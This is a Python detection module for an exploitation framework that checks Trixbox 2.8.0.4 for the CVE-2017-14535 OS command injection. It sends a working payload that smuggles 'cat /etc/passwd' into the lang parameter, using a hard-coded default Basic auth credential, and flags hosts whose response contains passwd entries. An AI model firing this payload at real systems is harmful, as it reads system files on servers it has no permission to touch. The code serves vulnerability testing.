#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Trixbox 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Trixbox - 2.8.0.4 OS Command Injection Detection',
        'description': 'Trixbox 2.8.0.4 is vulnerable to OS command injection via shell metacharacters in the lang parameter to /maint/modules/home/index.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'trixbox', 'rce', 'injection', 'edb', 'netfortris', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://secur1tyadvisory.wordpress.com/2018/02/11/trixbox-os-command-injection-vulnerability-cve-2017-14535/',
            'https://www.exploit-db.com/exploits/49913',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-14535',
            'https://www.linkedin.com/pulse/trixbox-os-command-injection-vulnerability-sachin-wagh-ceh-ecsa-/?published=t',
            'https://twitter.com/tiger_tigerboy/status/962689803270500352',
        ],
        'cve': 'CVE-2017-14535',
    }

    def run(self):
        path = '/maint/modules/home/index.php?lang=english|cat%20/etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'de,en-US;q=0.7,en;q=0.3', 'Authorization': 'Basic bWFpbnQ6cGFzc3dvcmQ=', 'Connection': 'close', 'Cache-Control': 'max-age=0'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='high', reason='Trixbox - 2.8.0.4 OS Command Injection detected', path=path)
            return True
        return False

